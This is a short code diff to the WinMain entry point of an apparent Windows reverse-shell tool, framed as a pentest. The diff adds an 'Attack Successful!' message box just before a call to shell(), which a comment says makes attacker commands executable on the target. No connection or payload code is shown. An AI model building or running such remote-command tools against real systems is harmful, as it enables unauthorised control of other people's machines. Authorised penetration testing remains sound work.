@@ -303,6 +303,9 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
       goto start;
     }
 
+    //Adding the pentest success message to the target.
+    MessageBox(NULL, TEXT("Attack Successful!"), TEXT("Access Granted"), MB_OK | MB_ICONERROR);
+
     //if connectione was successful start the shell function.
     //which will make the attacker commands executable in the target. 
     shell();
